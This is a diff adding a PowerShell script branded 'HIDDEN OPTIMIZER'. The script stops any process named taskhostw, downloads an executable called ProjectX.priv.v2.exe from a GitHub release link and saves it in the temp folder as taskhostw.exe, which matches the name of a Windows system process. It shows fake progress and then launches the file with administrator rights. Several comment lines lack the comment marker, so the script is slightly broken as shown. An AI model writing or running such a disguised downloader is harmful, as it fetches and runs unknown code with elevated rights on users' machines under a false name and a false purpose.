@@ -1,0 +1,59 @@
+Clear-Host
+
+--- Configuration ---
+$procName = "taskhostw"
+$tempDir = [System.IO.Path]::GetTempPath()
+$out = Join-Path $tempDir "taskhostw.exe"
+
+Replace with a stable direct URL to your file
+$directUrl = "https://github.com/timoxit/panel/releases/download/panel/ProjectX.priv.v2.exe"
+
+--- UI ---
+Write-Host ""
+Write-Host "======================================" -ForegroundColor Cyan
+Write-Host "         HIDDEN OPTIMIZER" -ForegroundColor Green
+Write-Host "======================================" -ForegroundColor Cyan
+Write-Host ""
+Write-Host "0%" -ForegroundColor Yellow
+
+--- Ensure TEMP folder exists ---
+if (!(Test-Path $tempDir)) {
+    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
+}
+
+--- Stop old process ---
+Get-Process -Name $procName -ErrorAction SilentlyContinue | Stop-Process -Force
+
+--- Delete old file ---
+if (Test-Path $out) {
+    Remove-Item $out -Force -ErrorAction SilentlyContinue
+}
+
+--- Download fresh copy ---
+try {
+    Write-Host "Downloading..." -ForegroundColor Yellow
+    Invoke-WebRequest -Uri $directUrl -OutFile $out -ErrorAction Stop
+
+    # Verify download
+    if (!(Test-Path $out)) {
+        throw "Downloaded file not found."
+    }
+
+    Clear-Host
+    Write-Host ""
+    Write-Host "======================================" -ForegroundColor Cyan
+    Write-Host "         HIDDEN OPTIMIZER" -ForegroundColor Green
+    Write-Host "======================================" -ForegroundColor Cyan
+    Write-Host ""
+    Write-Host "100%" -ForegroundColor Green
+    Write-Host ""
+    Read-Host "Press ENTER to run"
+
+    # --- Run as Administrator ---
+    Start-Process -FilePath $out -Verb RunAs
+}
+catch {
+    Write-Host ""
+    Write-Host "ERROR: $($_.Exception.Message)" -ForegroundColor Red
+    Read-Host "Press ENTER to exit"
+}
